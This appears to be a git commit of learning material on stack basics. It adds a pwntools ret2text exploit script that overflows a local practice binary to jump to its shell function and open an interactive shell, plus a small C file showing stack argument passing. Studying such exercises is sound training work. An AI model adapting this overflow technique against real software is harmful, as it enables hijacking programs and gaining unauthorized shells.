317dcac55d419620ce7b48ce36c7cc144688ef03
badmonkey7 <1366107236@qq.com>
2020-10-22 11:46:05 +0800

    basic knowledge about stack

---
+++ ret2text_32.py
@@ -0,0 +1,46 @@
+
+from pwn import *
+
+# debug = False
+# 设置调试环境
+# context.log_level = 'debug'
+# 设置tmux程序
+# context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
+
+p = process("./ret2text_32")
+elf = ELF("./ret2text_32")
+# gdb.attach(p)
+# log.success("pid = {}".format(pidof(p)))
+log.success("shell  = {}".format(hex(elf.sym['shell'])))
+
+shelladd = elf.sym['shell']
+
+offset = 22
+# shell = 0x8049186
+#
+# payload = flat(['a'*offset,p64(shelladd)])
+#
+# pause()
+p.sendline(b'a'*offset+p32(shelladd))
+
+p.interactive()
+# from tqdm import tqdm
+# for i in tqdm(range(50,80)):
+#
+#     p = process("./ret2text_32")
+#     shell = 0x8049186
+#     #
+#     # payload = flat(['a'*offset,p64(shelladd)])
+#     #
+#     p.sendline(b'a' * i + p32(shell))
+#     p.sendline("ls")
+#     try:
+#         print(p.recvline())
+#         print(i)
+#         p.interactive()
+#     except:
+#         p.close()
+#         continue
+
+
+
---
+++ stack_64.c
@@ -0,0 +1,9 @@
+#include<stdio.h>
+int stack_64(int a,int b,int c,int d,int e,int f,int g,int h,int k){
+    return a+b+c+d+e+f+g+h+k;
+}
+
+int main(){
+    stack_64(1,2,3,4,5,6,7,8,9);
+    return 0;
+}
